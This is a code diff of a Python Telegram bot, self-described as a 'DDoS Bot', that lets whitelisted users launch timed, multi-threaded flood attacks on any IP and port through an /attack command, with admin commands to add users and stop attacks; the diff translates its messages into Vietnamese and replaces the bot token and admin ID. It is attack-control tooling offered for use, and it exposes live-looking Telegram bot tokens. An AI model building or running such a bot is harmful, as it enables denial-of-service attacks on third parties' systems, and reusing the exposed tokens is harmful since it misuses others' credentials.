@@ -5,13 +5,13 @@ import re
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = "7922677033:AAHqAvqvQnkspWONKlwYtqFEzF-MyG4FttQ"
-ADMIN_USER_ID =1889589093   # Change this to your Telegram user ID
+TELEGRAM_BOT_TOKEN = "7566533314:AAHaYpNzERykihJBDlt0N-Pzbf5cWLBmko0"
+ADMIN_USER_ID = 6142730696  # Thay đổi thành ID Telegram của bạn
 USERS_FILE = "users.txt"
 attack_in_progress = False
-attack_process = None  # Store the process running the attack
+attack_process = None  # Lưu trữ tiến trình tấn công
 
-# Load allowed users from file
+# Tải danh sách người dùng từ tệp
 def load_users():
     try:
         with open(USERS_FILE) as f:
@@ -28,8 +28,8 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🔥 Welcome to DDoS Bot 🔥*\n"
-        "*🔥 Use /attack <ip:port> <time> <threads> to launch an attack*"
+        "*🔥 Chào mừng đến với DDoS Bot 🔥*\n"
+        "*🔥 Sử dụng lệnh /attack <ip:port> <thời gian> <số luồng> để bắt đầu tấn công*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
 
@@ -38,11 +38,11 @@ async def manage(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
         return
 
     if len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /manage add|rem <user_id>*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*Cách dùng: /manage add|rem <user_id>*", parse_mode="Markdown")
         return
 
     command, target_user_id = args
@@ -51,11 +51,11 @@ async def manage(update: Update, context: CallbackContext):
     if command == "add":
         users.add(target_user_id)
         save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đã thêm người dùng {target_user_id}.*", parse_mode="Markdown")
     elif command == "rem":
         users.discard(target_user_id)
         save_users(users)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đã xóa người dùng {target_user_id}.*", parse_mode="Markdown")
 
 async def run_attack(chat_id, ip, port, time, threads, context):
     global attack_in_progress, attack_process
@@ -75,12 +75,12 @@ async def run_attack(chat_id, ip, port, time, threads, context):
             print(f"[stderr]\n{stderr.decode()}")
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Lỗi: {str(e)}*", parse_mode="Markdown")
 
     finally:
         attack_in_progress = False
         attack_process = None
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Cuộc tấn công đã hoàn thành!*", parse_mode="Markdown")
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -90,28 +90,28 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
         return
 
     if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ An attack is already running! Wait before starting a new one.*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Một cuộc tấn công khác đang diễn ra! Vui lòng chờ.*", parse_mode="Markdown")
         return
 
     if len(args) < 2 or len(args) > 3:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip:port> <time> [threads]*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*Cách dùng: /attack <ip:port> <thời gian> [số luồng]*", parse_mode="Markdown")
         return
 
     match = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", args[0])
     if not match:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP:Port format. Use 103.219.202.12:10016*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Sai định dạng IP:Port. Ví dụ: 103.219.202.12:10016*", parse_mode="Markdown")
         return
 
     ip = match.group(1)
     port = match.group(2)
     time = args[1]
-    threads = args[2] if len(args) == 3 else "1"  # Default threads to 1
+    threads = args[2] if len(args) == 3 else "1"  # Mặc định là 1 luồng
 
-    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Attack started on {ip}:{port} for {time} seconds with {threads} threads!*", parse_mode="Markdown")
+    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Đang tấn công {ip}:{port} trong {time} giây với {threads} luồng!*", parse_mode="Markdown")
 
     asyncio.create_task(run_attack(chat_id, ip, port, time, threads, context))
 
@@ -122,29 +122,29 @@ async def stop(update: Update, context: CallbackContext):
     user_id = str(update.effective_user.id)
 
     if user_id != str(ADMIN_USER_ID):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Permission Denied!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Bạn không có quyền!*", parse_mode="Markdown")
         return
 
     if not attack_in_progress or attack_process is None:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack is running!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Không có cuộc tấn công nào đang diễn ra!*", parse_mode="Markdown")
         return
 
     try:
-        # First, send SIGINT (CTRL+C)
+        # Gửi tín hiệu SIGINT (CTRL+C)
         os.kill(attack_process.pid, signal.SIGINT)
-        await asyncio.sleep(1)  # Give time for graceful shutdown
+        await asyncio.sleep(1)  # Chờ dừng hoàn toàn
 
-        # If still running, force kill
+        # Nếu tiến trình vẫn chạy, buộc dừng
         if attack_process.returncode is None:
             os.kill(attack_process.pid, signal.SIGKILL)
 
         attack_in_progress = False
         attack_process = None
 
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Stopped!*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Đã dừng tấn công!*", parse_mode="Markdown")
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error Stopping Attack: {str(e)}*", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Lỗi khi dừng tấn công: {str(e)}*", parse_mode="Markdown")
 
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
